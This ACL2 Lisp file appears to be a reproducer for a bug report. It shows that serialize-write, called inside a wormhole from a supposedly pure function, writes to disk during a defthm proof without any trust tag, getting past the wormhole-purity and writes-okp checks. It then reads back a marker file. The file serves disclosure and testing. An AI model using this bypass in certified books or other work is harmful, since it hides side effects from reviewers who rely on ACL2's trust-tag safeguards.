; Reproducer: serialize-write bypasses *wormholep* (wormhole purity) and writes-okp
; (certify-book / make-event trust-tag restriction) without any trust tag (:ttags nil).
;
; Compare serialize-write-fn (serialize.lisp:37-51) against open-output-channel
; (axioms.lisp:19295-19316):
;   - open-output-channel checks *wormholep* (calling wormhole-er) and checks
;     (f-get-global 'writes-okp state), requiring defttag + open-output-channel!
;     whenever writes-okp is nil (such as during certify-book / make-event).
;   - serialize-write-fn requires NO trust tag and directly invokes Common Lisp
;     (with-open-file (stream filename :direction :output :if-exists :supersede) ...).

(in-package "ACL2")

; 1. State-free guard-verified :logic function that writes to disk from a wormhole
;    when simplified during a pure defthm proof:
(defun pure-state-free-fn (x)
  (declare (xargs :guard t))
  (prog2$
   (wormhole 'wh-write
             '(lambda (whs) whs)
             nil
             '(let ((state (serialize-write "wormhole_pwned.sao" '(:written-from-wormhole))))
                (value :q))
             :ld-prompt nil
             :ld-verbose nil
             :ld-pre-eval-print nil
             :ld-post-eval-print nil)
   x))

; Evaluating (pure-state-free-fn 42) during proof simplification writes wormhole_pwned.sao!
(defthm pure-proof-triggers-disk-write
  (equal (pure-state-free-fn 42) 42)
  :rule-classes nil)

(mv-let (val state)
  (serialize-read "wormhole_pwned.sao")
  (prog2$
   (cw "@SANDBOX-WORMHOLE host=~x0 payload=~x1 ttags=~x2~%"
       (@ host-lisp) val (global-val 'ttags-seen (w state)))
   state))
